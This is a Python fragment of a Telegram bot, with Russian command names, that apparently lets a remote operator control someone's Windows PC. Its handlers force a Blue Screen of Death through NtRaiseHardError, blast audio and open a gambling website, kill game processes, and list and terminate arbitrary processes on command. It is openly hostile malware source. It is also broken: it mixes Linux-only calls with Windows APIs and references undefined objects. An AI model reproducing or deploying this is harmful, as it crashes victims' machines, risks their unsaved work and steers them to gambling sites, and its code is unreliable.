from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import os
os.system('pip install alsaaudio')
import webbrowser
import alsaaudio
import playsound
from subprocess import check_output
import psutil
@bot.message_handler(commands=['Вызвать BSoD'])
def bsod():
    nullpointer = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )
    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullpointer,
        nullpointer,
        c_uint(6),
        byref(c_uint())
    )
@bot.message_handler(commands=['Открыть казик'])
def kazik():
    miksher = alsaaudio.Mixer()
    miksher.setvolume(100)
    playsound.playsound(r'%APPDATA%\kazik.mp3')
    webbrowser.open(url='https://kingvulcan.live/', new=1)
    try:
        os.kill(check_output(["pidof", 'minecraft.exe']))
    except:
        pass
    try:
        os.kill(check_output(["pidof", 'javaw.exe']))
    except:
        pass
@bot.message_handler(commands=['Убить процесс'])    
def process_killer():
    kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    for process in psutil.process_iter():
        bot.send_message(message.chat.id, f'Имя: {process.name}, PID: {process.pid}')        
    bot.send_message(message.chat.id, 'Напишите PID процесса для завершения')
    
    @bot.message_handler(content_types=['text'])
    def pk_kill_handle():
        try:
            os.kill(int(message.text), 1)
        except OSError:
            print('Неверный PID')
        except ValueError:
            print('Введите целочисленный PID')
        except SystemError:
            print('ШindoШыs отказала в доступе(((')
